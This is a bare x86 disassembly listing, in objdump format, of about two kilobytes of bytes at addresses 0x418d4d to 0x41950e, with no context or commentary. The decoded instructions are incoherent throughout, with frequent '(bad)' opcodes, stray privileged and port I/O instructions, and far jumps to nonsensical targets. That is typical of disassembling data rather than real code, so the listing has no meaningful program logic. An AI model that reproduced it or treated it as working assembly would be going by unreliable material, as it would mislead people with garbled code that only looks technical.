  418d4d:	hlt    
  418d4e:	iret   
  418d4f:	mov    ds:0xd7fde8dd,eax
  418d54:	add    DWORD PTR [ecx],eax
  418d56:	test   bl,bl
  418d58:	add    al,dh
  418d5a:	mov    WORD PTR ds:0x89b7efb1,ds
  418d60:	jl     0x418dac
  418d62:	jmp    0x418db4
  418d64:	xor    DWORD PTR [esp+ebp*1+0x1de14830],ebx
  418d6b:	mov    edi,0xef1dd8c1
  418d70:	push   0x65
  418d72:	xor    esp,DWORD PTR [edi-0x6c592e73]
  418d78:	xchg   ecx,eax
  418d79:	sbb    ah,BYTE PTR [ebp-0x1a]
  418d7c:	push   0xbb3b8761
  418d81:	jne    0x418d60
  418d83:	xchg   esp,eax
  418d84:	dec    esp
  418d85:	adc    dh,BYTE PTR [esi+0x2c]
  418d88:	xchg   edx,eax
  418d89:	adc    al,al
  418d8b:	retf   0xb63f
  418d8e:	sub    eax,0xce52ae97
  418d93:	add    eax,0xee00303c
  418d98:	mov    eax,0x80fd0e9e
  418d9d:	jg     0x418dc1
  418d9f:	jmp    0x58ec6c6b
  418da4:	mov    cl,0x2b
  418da6:	xor    DWORD PTR [edi],edx
  418da8:	gs jmp 0x418de9
  418dab:	ins    BYTE PTR es:[edi],dx
  418dac:	and    al,0x98
  418dae:	cmp    al,0xe9
  418db0:	outs   dx,BYTE PTR ds:[esi]
  418db2:	fnstcw WORD PTR [edi]
  418db4:	pop    edi
  418db5:	lds    ecx,FWORD PTR [edx+0x56]
  418db8:	dec    edx
  418db9:	pop    eax
  418dba:	mov    cl,0x4c
  418dbc:	mov    eax,0x57302558
  418dc1:	jg     0x418dc0
  418dc3:	cmp    DWORD PTR [edi],edx
  418dc5:	daa    
  418dc6:	and    eax,0x40c28ae0
  418dcb:	adc    bh,BYTE PTR [eax-0x4fd3c3ff]
  418dd1:	ss shl edx,1
  418dd4:	out    0x62,eax
  418dd6:	adc    eax,0x28fce41d
  418ddb:	xor    eax,0x58aff3ca
  418de0:	stos   DWORD PTR es:[edi],eax
  418de1:	pop    ss
  418de2:	(bad)
  418de6:	xor    DWORD PTR [eax],esi
  418de8:	gs xor eax,0xef72e50d
  418dee:	adc    al,0xda
  418df0:	fwait
  418df1:	xchg   DWORD PTR [ebx-0xedacb2e],edx
  418df7:	dec    edx
  418df8:	xchg   edx,eax
  418df9:	cld    
  418dfa:	push   esp
  418dfb:	xor    BYTE PTR [eax],cl
  418dfd:	addr16 out 0x52,eax
  418e00:	xor    BYTE PTR [ebx],0x7b
  418e03:	cmp    al,0x51
  418e05:	push   0xffffff88
  418e07:	daa    
  418e08:	out    dx,eax
  418e09:	daa    
  418e0a:	sbb    eax,0x26df3b9d
  418e0f:	inc    ebx
  418e10:	addr16 pop ds
  418e12:	mov    BYTE PTR [edx+0x5b],bl
  418e15:	mov    ah,0xa9
  418e17:	dec    ecx
  418e18:	pop    ebp
  418e19:	call   0x6cf8d123
  418e1e:	or     edi,DWORD PTR [esi]
  418e20:	lds    ebx,FWORD PTR [esi-0x170b5b8f]
  418e26:	adc    DWORD PTR [edx+ecx*2+0x25],0x38a49a38
  418e2e:	inc    esi
  418e2f:	dec    esi
  418e30:	call   0x8ffa:0x32c5deea
  418e37:	ret    
  418e38:	sub    esi,DWORD PTR [eax+0x1fda18b1]
  418e3e:	aam    0xbc
  418e40:	rol    BYTE PTR [ebx+eiz*8-0x6d0e707a],cl
  418e47:	add    DWORD PTR [eax+0x54caea50],ebp
  418e4d:	inc    ecx
  418e4e:	std    
  418e4f:	fbld   TBYTE PTR [esi-0x4117a380]
  418e55:	into   
  418e56:	call   FWORD PTR [ecx+0x71]
  418e59:	or     al,0xb8
  418e5b:	push   edx
  418e5c:	adc    eax,ebp
  418e5e:	ins    BYTE PTR es:[edi],dx
  418e5f:	cmc    
  418e60:	ins    BYTE PTR es:[edi],dx
  418e61:	xor    edi,DWORD PTR [ecx-0x683d40d]
  418e67:	sub    BYTE PTR [ecx-0x382713cd],0xe4
  418e6e:	test   al,0x52
  418e70:	lahf   
  418e71:	(bad)  
  418e72:	mov    bh,0x3a
  418e74:	call   0x3ea1:0xeebfae48
  418e7b:	ins    BYTE PTR es:[edi],dx
  418e7c:	mov    WORD PTR [edi],?
  418e7e:	mov    ebp,0xdcfecaf0
  418e83:	rcr    edx,cl
  418e85:	(bad)  
  418e86:	jg     0x418ed3
  418e88:	inc    esp
  418e89:	cmc    
  418e8a:	adc    DWORD PTR es:[edx+0x7df3e4c7],edi
  418e91:	dec    esi
  418e92:	mov    ecx,0x492ff818
  418e97:	or     edx,DWORD PTR [ebp+0x44]
  418e9a:	jnp    0x418ec4
  418e9c:	out    0x24,al
  418e9e:	and    DWORD PTR [ebp-0xd86a9c4],ebx
  418ea4:	icebp  
  418ea5:	mov    eax,ds:0x18389352
  418eaa:	and    dh,BYTE PTR [edx-0x29b02ab6]
  418eb0:	sub    BYTE PTR [edx+0x5898a2ee],dl
  418eb6:	in     al,0xee
  418eb8:	xchg   ebp,eax
  418eb9:	inc    ebp
  418eba:	dec    eax
  418ebb:	cs mov al,0xb1
  418ebe:	and    BYTE PTR [ebp+edx*1+0x11bdb95],al
  418ec5:	icebp  
  418ec6:	test   eax,0x292c1acc
  418ecb:	xchg   ebx,eax
  418ecc:	cmp    eax,0x114efe48
  418ed1:	aam    0x79
  418ed3:	imul   esp,DWORD PTR [esi],0x40
  418ed6:	pop    ebp
  418ed7:	nop
  418ed8:	sub    edi,DWORD PTR [si+0x9]
  418edc:	daa    
  418edd:	hlt    
  418ede:	clc    
  418edf:	xor    al,BYTE PTR [esi+esi*2-0x31]
  418ee3:	pop    ebp
  418ee4:	mov    eax,ds:0x18c96c4a
  418ee9:	aas    
  418eea:	xchg   esi,eax
  418eeb:	scas   al,BYTE PTR es:[edi]
  418eec:	adc    edx,DWORD PTR ds:0x5e5ea4ba
  418ef2:	ja     0x418f00
  418ef4:	or     al,0x84
  418ef6:	mov    ebx,0x6cdd4198
  418efb:	dec    esp
  418efc:	mov    ch,0x38
  418efe:	or     edx,ebx
  418f00:	fcmovne st,st(1)
  418f02:	push   cs
  418f03:	mov    bh,0x5a
  418f05:	push   ebp
  418f06:	int    0xb6
  418f08:	or     ebp,DWORD PTR [ebx-0x50]
  418f0b:	mov    DWORD PTR [edi+0x65df051d],ebp
  418f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f12:	xor    al,0x5
  418f14:	std    
  418f15:	(bad)  
  418f16:	(bad)  
  418f17:	call   0x6749:0xd08b6072
  418f1e:	inc    ecx
  418f1f:	mov    al,ds:0xfe3c2bf4
  418f24:	and    eax,0xf8dda1cd
  418f29:	pop    ds
  418f2a:	pop    edx
  418f2b:	cmp    ch,BYTE PTR [ecx]
  418f2d:	fidiv  DWORD PTR [eax+ebx*4]
  418f30:	cmp    BYTE PTR [esp+edi*1-0x40],0x7c
  418f35:	ficom  WORD PTR [eax]
  418f37:	arpl   WORD PTR [ecx],bx
  418f39:	inc    esp
  418f3a:	ins    DWORD PTR es:[edi],dx
  418f3b:	pushf  
  418f3c:	jecxz  0x418ee5
  418f3e:	shl    DWORD PTR [ebp-0x42],cl
  418f41:	jo     0x418fa9
  418f43:	in     al,0x34
  418f45:	test   al,0xbf
  418f47:	fbld   TBYTE PTR [eax-0x41]
  418f4a:	ins    DWORD PTR es:[edi],dx
  418f4b:	or     bl,BYTE PTR [edi]
  418f4d:	(bad)  
  418f4e:	or     al,ah
  418f50:	or     esi,DWORD PTR [edi-0x5d]
  418f53:	leave  
  418f54:	xchg   esp,eax
  418f55:	push   es
  418f56:	out    0xad,al
  418f58:	retf   0xe005
  418f5b:	inc    edx
  418f5c:	mov    dh,0x91
  418f5e:	(bad)  
  418f5f:	leave  
  418f60:	out    0x60,eax
  418f62:	add    eax,0x49d4f348
  418f67:	not    bl
  418f69:	shl    eax,cl
  418f6b:	mov    bh,0xf9
  418f6d:	adc    BYTE PTR [edi],dh
  418f6f:	add    bh,BYTE PTR [eax-0x4c]
  418f72:	(bad)  
  418f74:	pushf  
  418f75:	push   ebp
  418f76:	cmp    DWORD PTR [esi],edi
  418f78:	add    ch,BYTE PTR [eax-0x2b02495b]
  418f7e:	inc    ebx
  418f7f:	(bad)
  418f82:	push   0x8c9b4c30
  418f87:	fcomp  QWORD PTR [eax-0x25]
  418f8a:	and    dh,BYTE PTR ds:0x3c83e521
  418f90:	sahf   
  418f91:	outs   dx,BYTE PTR ds:[esi]
  418f92:	pop    edi
  418f93:	in     eax,dx
  418f94:	scas   eax,DWORD PTR es:[edi]
  418f95:	mov    ds:0xac3ab359,eax
  418f9a:	arpl   WORD PTR ds:[edi],ax
  418f9d:	adc    BYTE PTR [ebp-0x1a8a179b],dl
  418fa3:	fwait
  418fa4:	(bad)  
  418fa5:	fiadd  WORD PTR ds:0x65414ce0
  418fab:	jbe    0x418fbf
  418fad:	adc    al,0xa1
  418faf:	(bad)  
  418fb0:	(bad)  
  418fb1:	scas   eax,DWORD PTR es:[edi]
  418fb2:	gs sub al,0x66
  418fb5:	pusha  
  418fb6:	push   ebx
  418fb7:	push   edi
  418fb8:	es aaa 
  418fba:	pop    ecx
  418fbb:	cdq    
  418fbc:	dec    edx
  418fbd:	push   edi
  418fbe:	jbe    0x418fca
  418fc0:	sub    al,0x5b
  418fc2:	sbb    DWORD PTR [ecx-0x9],eax
  418fc5:	adc    BYTE PTR [eax+0xb],dl
  418fc8:	ror    dh,1
  418fca:	mov    eax,ds:0xaeeb5c93
  418fcf:	les    ebp,FWORD PTR [ebp+eiz*4+0x6828047e]
  418fd6:	xchg   esi,eax
  418fd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fd8:	test   DWORD PTR [eax],ebx
  418fda:	shl    BYTE PTR [edi],0x50
  418fdd:	jb     0x419030
  418fdf:	mov    cl,0x49
  418fe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fe2:	in     eax,dx
  418fe3:	dec    BYTE PTR [ebx]
  418fe5:	enter  0x19e2,0x71
  418fe9:	push   ebp
  418fea:	xchg   DWORD PTR [ebx],ebx
  418fec:	les    esp,FWORD PTR [esi]
  418fee:	add    al,0x2c
  418ff0:	adc    DWORD PTR [ebp-0x10e9b7d1],ebx
  418ff6:	sub    esp,edi
  418ff8:	lds    ebp,FWORD PTR [esi-0x4cd7144a]
  418ffe:	add    DWORD PTR [ecx],esi
  419000:	inc    ebp
  419001:	mov    esp,0x1c04910f
  419006:	push   es
  419007:	or     BYTE PTR [ecx+0x518b72bf],0x10
  41900e:	(bad)  
  41900f:	call   0x4692:0x7579723a
  419016:	shl    DWORD PTR [eax],0xa6
  419019:	int3   
  41901a:	xor    eax,0x751cf5cd
  41901f:	in     eax,0xb1
  419021:	mov    dh,0xb7
  419023:	aam    0xde
  419025:	mov    al,ds:0x11af65f4
  41902a:	std    
  41902b:	aam    0x59
  41902d:	lahf   
  41902e:	outs   dx,DWORD PTR ds:[esi]
  41902f:	sahf   
  419030:	mov    ch,0x71
  419032:	jmp    0x4965:0x3b90783a
  419039:	loope  0x418fe5
  41903b:	xchg   DWORD PTR [esi-0x36],esi
  41903e:	scas   eax,DWORD PTR es:[edi]
  41903f:	in     eax,dx
  419040:	das    
  419041:	jb     0x41907e
  419043:	cmp    al,0x1b
  419045:	mov    esi,0x5dc0532
  41904a:	cmp    eax,0xbcf16258
  41904f:	stc    
  419050:	cmp    eax,0xa38fe7d4
  419055:	adc    al,0xb9
  419057:	ret    0x8b2e
  41905a:	sub    BYTE PTR cs:[ebp+0x37d49172],0xf8
  419062:	sbb    eax,0xf07fbfea
  419067:	int3   
  419068:	aam    0x58
  41906a:	push   0x9e5cb823
  41906f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419070:	and    BYTE PTR [eax],bl
  419072:	imul   al
  419074:	pop    ebx
  419075:	cwde   
  419076:	pop    eax
  419077:	aam    0x4
  419079:	mov    eax,0x250c31fb
  41907e:	jnp    0x419065
  419080:	lods   al,BYTE PTR gs:[esi]
  419082:	cs call 0x66285c60
  419088:	mov    ch,0x55
  41908a:	push   0x98b2edad
  41908f:	aas    
  419090:	retf   0xbcd7
  419093:	or     BYTE PTR [esi-0x3c],0xd
  419097:	push   ds
  419098:	add    ebp,edx
  41909a:	fwait
  41909b:	dec    esi
  41909c:	es cmp eax,0x70b00872
  4190a2:	(bad)  [edi-0x4389f583]
  4190a8:	imul   esi,DWORD PTR [ebp+0x69],0x23
  4190ac:	jmp    0x9276:0xc5c5780c
  4190b3:	xor    DWORD PTR [ebp+0x3c],edi
  4190b6:	jae    0x419120
  4190b8:	popf   
  4190b9:	mov    esi,0xfd871dfa
  4190be:	adc    ecx,ecx
  4190c0:	xor    bl,ch
  4190c2:	mov    al,0x9b
  4190c4:	daa    
  4190c5:	pop    ss
  4190c6:	add    dh,BYTE PTR [eax]
  4190c8:	fist   WORD PTR [esi+0x20]
  4190cb:	cli    
  4190cc:	sbb    al,0xb5
  4190ce:	(bad)  
  4190cf:	je     0x4190ea
  4190d1:	cld    
  4190d2:	nop
  4190d3:	dec    ecx
  4190d4:	ds shr DWORD PTR ds:[ecx-0x5e],0xdc
  4190da:	sub    BYTE PTR [eax+0x30e9953c],ah
  4190e0:	xor    DWORD PTR [ecx-0x6047b825],ebp
  4190e6:	in     al,dx
  4190e7:	fmul   DWORD PTR [ebx-0x93cd98c]
  4190ed:	add    al,0x26
  4190ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190f0:	mov    edi,esi
  4190f2:	iret   
  4190f3:	das    
  4190f4:	mov    ecx,0xacc865aa
  4190f9:	ins    BYTE PTR es:[edi],dx
  4190fa:	pushf  
  4190fb:	xor    eax,DWORD PTR [ebx]
  4190fd:	arpl   WORD PTR [edi-0x54a317bd],bp
  419103:	mov    WORD PTR [esp+esi*2+0x1a414423],gs
  41910a:	jne    0x41911d
  41910c:	xor    al,0x92
  41910e:	sbb    eax,0x66b118a5
  419113:	or     ecx,DWORD PTR [edx]
  419115:	ins    DWORD PTR es:[edi],dx
  419116:	imul   ecx,ecx,0x48
  419119:	push   edi
  41911a:	xor    al,BYTE PTR [ebp-0x742efd55]
  419120:	push   0xffffffa1
  419122:	sbb    al,0x4f
  419124:	or     bl,BYTE PTR [edi]
  419126:	fcmove st,st(1)
  419128:	pop    eax
  419129:	mov    al,ds:0x497ff549
  41912e:	push   ebx
  41912f:	in     al,dx
  419130:	(bad)  
  419131:	push   edi
  419132:	pushf  
  419133:	cmp    eax,0xcc3089e1
  419138:	mov    dh,0xd6
  41913a:	mov    ecx,0x3095ef2b
  41913f:	sbb    BYTE PTR [ebx+edx*1+0x571b7193],0xa0
  419147:	into   
  419148:	(bad)  
  41914a:	mov    dh,BYTE PTR [ecx+edx*8+0x3cbe1da0]
  419151:	test   eax,0xe97f151f
  419156:	jmp    FWORD PTR [edi-0x44ae387a]
  41915c:	dec    ecx
  41915d:	adc    al,BYTE PTR [edx]
  41915f:	test   BYTE PTR [esi-0x62],dh
  419162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419163:	ins    DWORD PTR es:[edi],dx
  419164:	sahf   
  419165:	ret    
  419166:	stc    
  419167:	je     0x41910c
  419169:	and    ch,BYTE PTR [ebx]
  41916b:	(bad)  
  41916c:	cdq    
  41916d:	pop    esi
  41916e:	ins    BYTE PTR es:[edi],dx
  41916f:	pop    ds
  419170:	and    DWORD PTR ds:0x3e8d19ea,edi
  419176:	add    BYTE PTR [eax],cl
  419178:	inc    ebx
  419179:	test   eax,0x2baa5514
  41917e:	sub    edi,DWORD PTR [ecx-0x5b]
  419181:	inc    esi
  419182:	mov    dl,0x86
  419184:	xchg   DWORD PTR [eax-0x5b],edx
  419187:	test   esi,ebp
  419189:	cwde   
  41918a:	jo     0x4191d9
  41918c:	inc    eax
  41918d:	inc    eax
  41918e:	enter  0xfeba,0x44
  419192:	pop    es
  419193:	push   0x5290869c
  419198:	(bad)  
  419199:	jg     0x4191ba
  41919b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41919c:	ins    BYTE PTR es:[edi],dx
  41919d:	xor    DWORD PTR [esi-0x77],esi
  4191a0:	mov    edi,0x84bbb579
  4191a5:	stc    
  4191a6:	fs nop
  4191a8:	push   ss
  4191a9:	pop    es
  4191aa:	xchg   esp,eax
  4191ab:	pop    edi
  4191ac:	or     ah,BYTE PTR [esi+0x42]
  4191af:	xchg   BYTE PTR [ebx-0x75],cl
  4191b2:	lds    ebx,FWORD PTR [ebp-0x400a700e]
  4191b8:	xchg   edx,eax
  4191b9:	dec    ecx
  4191ba:	and    BYTE PTR [edi-0x762079ac],ah
  4191c0:	(bad)  
  4191c1:	in     eax,dx
  4191c2:	cmp    eax,DWORD PTR [edi+0x3f]
  4191c5:	pop    ebp
  4191c6:	ja     0x419157
  4191c8:	mov    ds:0xe1846e8c,al
  4191cd:	ret    
  4191ce:	push   esp
  4191cf:	div    BYTE PTR [ebp+0x180e63ae]
  4191d5:	stos   BYTE PTR es:[edi],al
  4191d6:	mov    ecx,0x37f0555
  4191db:	and    al,0x1b
  4191dd:	pop    eax
  4191de:	ins    DWORD PTR es:[edi],dx
  4191df:	loop   0x419238
  4191e1:	dec    ebp
  4191e2:	adc    al,0x63
  4191e4:	loopne 0x4191a8
  4191e6:	cmp    BYTE PTR [edi+0x3fb2a49],ah
  4191ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191ed:	mov    esi,0xfc9fb555
  4191f2:	cmp    BYTE PTR [ecx+0x2c],ch
  4191f5:	push   esp
  4191f6:	fisubr WORD PTR [eax+0x7d]
  4191f9:	inc    ebx
  4191fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191fb:	add    ah,BYTE PTR [ebx]
  4191fd:	js     0x419253
  4191ff:	mov    al,ds:0x8cc00c9f
  419204:	repnz or ebp,DWORD PTR [esi-0x5ffb5347]
  41920b:	xor    ch,BYTE PTR [ecx-0x73]
  41920e:	(bad)  
  41920f:	jno    0x4191ff
  419211:	addr16 fmulp st(5),st
  419214:	jle    0x419206
  419216:	inc    edx
  419217:	cdq    
  419218:	in     eax,0x94
  41921a:	mov    al,ds:0x10a09a29
  41921f:	fnstenv [edi+esi*1]
  419222:	push   ecx
  419223:	scas   eax,DWORD PTR es:[edi]
  419224:	popf   
  419225:	xor    DWORD PTR [ecx],esp
  419227:	and    eax,0x210d5e50
  41922c:	(bad)  
  41922d:	xor    ah,BYTE PTR [ebx]
  41922f:	xchg   esp,eax
  419230:	hlt    
  419231:	adc    eax,0xf4494f0e
  419236:	nop
  419237:	push   edx
  419238:	stc    
  419239:	jnp    0x419204
  41923b:	mov    dl,BYTE PTR [eax-0x3f]
  41923e:	mov    eax,0xa13115e2
  419243:	nop
  419244:	mov    esp,0xe240fb52
  419249:	popa   
  41924a:	rol    BYTE PTR [ebx],cl
  41924c:	rol    DWORD PTR ds:0xb6f1445a,cl
  419252:	pop    esp
  419253:	cmp    DWORD PTR [eax],0xffffffac
  419256:	add    DWORD PTR ds:0xb219c0d7,eax
  41925c:	xor    edx,0x31da8c10
  419262:	(bad)  
  419263:	stos   DWORD PTR es:[edi],eax
  419264:	cwde   
  419265:	js     0x4192b7
  419267:	mov    esi,0xc2ca1338
  41926c:	fld    TBYTE PTR [edi+esi*1]
  41926f:	add    DWORD PTR [ebx+0x7e9277cd],esi
  419275:	adc    esi,ebx
  419277:	test   BYTE PTR [esi],bl
  419279:	or     ah,dl
  41927b:	pusha  
  41927c:	push   ecx
  41927d:	jnp    0x4192d7
  41927f:	repnz xchg ecx,eax
  419281:	push   ds
  419282:	push   ecx
  419283:	sbb    BYTE PTR [esi+0x13],dl
  419286:	fwait
  419287:	test   DWORD PTR [ecx],ecx
  419289:	xchg   ecx,eax
  41928a:	(bad)
  41928e:	xor    eax,0x99ca607d
  419294:	pop    ds
  419295:	repnz inc eax
  419297:	icebp  
  419298:	cmp    eax,0xb459b28c
  41929d:	xchg   edx,eax
  41929e:	out    0x7c,eax
  4192a0:	das    
  4192a1:	cmp    DWORD PTR [ecx+0x71],eax
  4192a4:	cli    
  4192a5:	outs   dx,DWORD PTR ds:[esi]
  4192a6:	test   DWORD PTR [esi],0x58e75668
  4192ac:	ins    DWORD PTR es:[edi],dx
  4192ad:	out    0x1c,eax
  4192af:	push   ecx
  4192b0:	inc    edx
  4192b1:	(bad)
  4192b5:	ins    BYTE PTR es:[edi],dx
  4192b6:	ret    
  4192b7:	int3   
  4192b8:	sbb    BYTE PTR [esi],ah
  4192ba:	and    al,0x9b
  4192bc:	neg    DWORD PTR [eax+0x683c9b1e]
  4192c2:	leave  
  4192c3:	xchg   edx,eax
  4192c4:	or     DWORD PTR [edx+0x5cfc6c4f],ebp
  4192ca:	aaa    
  4192cb:	cmp    esi,edi
  4192cd:	cli    
  4192ce:	mov    DWORD PTR [ebx+ebp*8],ecx
  4192d1:	add    bh,BYTE PTR [edx]
  4192d3:	jmp    0x391c6f25
  4192d8:	rol    BYTE PTR [eax],cl
  4192da:	inc    ecx
  4192db:	scas   al,BYTE PTR es:[edi]
  4192dc:	jl     0x419312
  4192de:	xchg   ebx,eax
  4192df:	lahf   
  4192e0:	dec    eax
  4192e1:	sbb    eax,0xa52865e9
  4192e6:	lods   eax,DWORD PTR ds:[esi]
  4192e7:	mov    al,ds:0x1d62eb20
  4192ec:	xchg   ebx,eax
  4192ed:	arpl   WORD PTR [eax-0x39],cx
  4192f0:	ja     0x419304
  4192f2:	out    dx,al
  4192f3:	dec    ebx
  4192f4:	sub    BYTE PTR [edi-0x54],al
  4192f7:	push   ebp
  4192f8:	pop    esi
  4192f9:	out    0x29,eax
  4192fb:	imul   ecx,edi,0xa2b7e0a
  419301:	mov    dl,0x78
  419303:	arpl   WORD PTR gs:[ebp-0x1b],dx
  419307:	pop    ds
  419308:	cmp    dl,0x4c
  41930b:	jp     0x4192d8
  41930d:	mov    ebx,0xa56b49b8
  419312:	sub    eax,0x2e706e41
  419317:	lock xchg ebx,eax
  419319:	loop   0x4192e2
  41931b:	fcmovnbe st,st(6)
  41931d:	mov    bh,0xf
  41931f:	sbb    ah,BYTE PTR [edx]
  419321:	std    
  419322:	pop    eax
  419323:	pop    edx
  419324:	enter  0x60e7,0x4c
  419328:	jmp    0x6976d455
  41932d:	fbld   TBYTE PTR [ebx-0x19]
  419330:	jge    0x419354
  419332:	in     eax,0x6d
  419334:	das    
  419335:	mov    ecx,0x6c1efd1
  41933a:	xor    esi,ebx
  41933c:	lods   eax,DWORD PTR ds:[esi]
  41933d:	scas   al,BYTE PTR es:[edi]
  41933e:	loope  0x41932b
  419340:	lahf   
  419341:	ins    DWORD PTR es:[edi],dx
  419342:	xlat   BYTE PTR ds:[ebx]
  419343:	xor    eax,0x1710a35b
  419348:	mov    ecx,ss
  41934a:	dec    edx
  41934b:	mov    eax,ds:0x9ef4ccbb
  419350:	mov    ebp,0x4122c6a1
  419355:	out    0x77,al
  419357:	loopne 0x419392
  419359:	push   ebx
  41935a:	jbe    0x41938f
  41935c:	or     eax,DWORD PTR [ebp-0x4a]
  41935f:	mov    cl,0xc3
  419361:	hlt    
  419362:	push   ss
  419363:	shl    eax,cl
  419365:	fcomp  DWORD PTR [esi]
  419367:	adc    eax,0xfee5a60a
  41936d:	adc    DWORD PTR [ebx+ebp*4],eax
  419370:	scas   eax,DWORD PTR es:[edi]
  419371:	imul   eax,ebp,0x62
  419374:	dec    esi
  419375:	fcmovbe st,st(0)
  419377:	dec    ecx
  419379:	repz jmp 0x581e:0xf2b03e41
  419381:	int3   
  419382:	dec    edi
  419383:	es or  al,0xc2
  419386:	leave  
  419387:	cmp    BYTE PTR [ebx-0x25b65ab],0xf7
  41938e:	pop    edi
  41938f:	mov    cl,BYTE PTR [eax]
  419391:	push   ebp
  419392:	pop    ecx
  419393:	adc    DWORD PTR [ecx+0x6b],edx
  419396:	lahf   
  419397:	sub    BYTE PTR [esi],bl
  419399:	test   BYTE PTR [eax+0x47],dh
  41939c:	cld    
  41939d:	inc    eax
  41939e:	cli    
  41939f:	aas    
  4193a0:	dec    esp
  4193a1:	mov    ebx,0x32b5173d
  4193a6:	rol    edx,1
  4193a8:	mov    dh,0x96
  4193aa:	xchg   edi,ecx
  4193ac:	mov    al,0xab
  4193ae:	js     0x41941b
  4193b0:	jae    0x41934b
  4193b2:	sub    BYTE PTR [edi],dl
  4193b4:	pop    ebp
  4193b5:	cdq    
  4193b6:	push   ss
  4193b7:	xor    BYTE PTR [ecx],al
  4193b9:	and    BYTE PTR [eax-0x7c],bl
  4193bc:	add    BYTE PTR [ebx+0x69e7c005],bh
  4193c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193c3:	in     eax,0x5a
  4193c5:	xor    BYTE PTR [ebp+0x35],ch
  4193c8:	adc    eax,0xe4e97069
  4193cd:	pop    esp
  4193ce:	lods   al,BYTE PTR ds:[esi]
  4193cf:	cmp    DWORD PTR [ecx-0x14edad08],edi
  4193d5:	es push cs
  4193d7:	retf   0xc0f
  4193da:	dec    edx
  4193db:	xor    edx,DWORD PTR [ebp-0x2f]
  4193de:	push   cs
  4193df:	sbb    al,0x5d
  4193e1:	sub    ch,BYTE PTR ss:[ebx+0x3e]
  4193e5:	mov    BYTE PTR [esi+0x2d59563a],0xd3
  4193ec:	icebp  
  4193ed:	ret    
  4193ee:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193f0:	dec    esi
  4193f1:	(bad)  
  4193f2:	cmp    DWORD PTR [esi+0x35a5ea6a],edi
  4193f8:	hlt    
  4193f9:	mov    edi,0x856164f5
  4193fe:	or     esp,0xd
  419401:	sbb    BYTE PTR [eax+0x1edff629],cl
  419407:	ss sub al,0x6c
  41940a:	retf   
  41940b:	into   
  41940c:	push   ss
  41940d:	test   al,0x40
  41940f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419410:	(bad)  
  419412:	leave  
  419413:	repz pop ebp
  419415:	imul   edx,DWORD PTR [eax],0xd26fd0c2
  41941b:	icebp  
  41941c:	loopne 0x41943e
  41941e:	push   esi
  41941f:	sub    ebx,DWORD PTR [eax-0xfe8af4]
  419425:	out    0xce,eax
  419427:	icebp  
  419428:	in     al,0x6f
  41942a:	pusha  
  41942b:	shl    BYTE PTR [ebp+eax*2-0x1a],1
  41942f:	stos   BYTE PTR es:[edi],al
  419430:	cmp    DWORD PTR [edi+ecx*2+0x585a6e42],ebp
  419437:	(bad)  
  419439:	ins    DWORD PTR es:[edi],dx
  41943a:	push   edi
  41943b:	dec    BYTE PTR [ebp+0x10e71a9]
  419441:	std    
  419442:	fnstsw WORD PTR [edx-0x216bd811]
  419448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419449:	mov    edx,0x6ba36ced
  41944e:	mov    cl,0xe4
  419450:	add    dl,0xb3
  419453:	daa    
  419454:	and    eax,0xf2f802de
  419459:	push   esi
  41945a:	cmp    eax,0xfb26080b
  41945f:	daa    
  419460:	out    dx,eax
  419461:	arpl   WORD PTR [esi+0x3b581853],bp
  419467:	adc    al,0x13
  419469:	scas   eax,DWORD PTR es:[edi]
  41946a:	mov    ?,WORD PTR [edi]
  41946c:	cmp    ah,BYTE PTR [edi*2+0x72a9e9d8]
  419473:	push   cs
  419474:	pop    ebp
  419475:	cli    
  419476:	repz les esi,FWORD PTR [edx]
  419479:	lods   eax,DWORD PTR ds:[esi]
  41947a:	ret    0x1f5
  41947d:	mov    ebx,0x504af3e9
  419482:	push   esi
  419483:	pop    ebx
  419484:	push   ecx
  419485:	pop    ecx
  419486:	nop
  419487:	mov    dl,0x58
  419489:	sub    DWORD PTR [esi],0x5e
  41948c:	push   ebx
  41948d:	in     eax,0xff
  41948f:	and    al,0x81
  419491:	hlt    
  419492:	jbe    0x41950b
  419494:	xchg   bh,bl
  419496:	fsub   DWORD PTR [esi+0x1c]
  419499:	mov    ds:0xfd293d99,al
  41949e:	sbb    BYTE PTR [ecx-0x5c4755f],bl
  4194a4:	inc    ebp
  4194a5:	in     al,dx
  4194a6:	mov    al,ds:0x6da873c1
  4194ab:	jp     0x419464
  4194ad:	pop    ecx
  4194ae:	and    BYTE PTR [edx+0x17],cl
  4194b1:	fwait
  4194b2:	jns    0x41951a
  4194b4:	outs   dx,DWORD PTR ds:[esi]
  4194b5:	dec    eax
  4194b6:	mov    BYTE PTR [ecx+0x33],dl
  4194b9:	jb     0x419503
  4194bb:	stos   DWORD PTR es:[edi],eax
  4194bc:	test   DWORD PTR [ebx-0x4a],edx
  4194bf:	fild   DWORD PTR [ebp+0x2c]
  4194c2:	mov    ah,0xc5
  4194c4:	mov    ecx,0x2087f5f9
  4194c9:	shl    dh,cl
  4194cb:	adc    al,0x8d
  4194cd:	pop    ds
  4194ce:	sub    DWORD PTR [edi-0x26],ebp
  4194d1:	lahf   
  4194d2:	cs lock jmp 0x4194f1
  4194d6:	add    ah,0xa
  4194d9:	adc    esi,DWORD PTR [esi-0x7219d9f5]
  4194df:	aaa    
  4194e0:	das    
  4194e1:	fst    DWORD PTR [edx]
  4194e3:	inc    edi
  4194e4:	adc    al,0x9c
  4194e6:	adc    eax,DWORD PTR [ebp-0x25]
  4194e9:	jmp    0x59babb97
  4194ee:	ret    0xbf15
  4194f1:	pop    eax
  4194f2:	jecxz  0x419508
  4194f4:	xor    al,dh
  4194f6:	jmp    0x5f8b291d
  4194fb:	loope  0x419553
  4194fd:	mov    esp,0xf80cb6f1
  419502:	or     ah,BYTE PTR [ebp-0x18]
  419505:	aaa    
  419506:	out    0x79,eax
  419508:	push   edi
  419509:	loop   0x41956e
  41950b:	xchg   ebp,esi
  41950d:	hlt    
  41950e:	cmc    
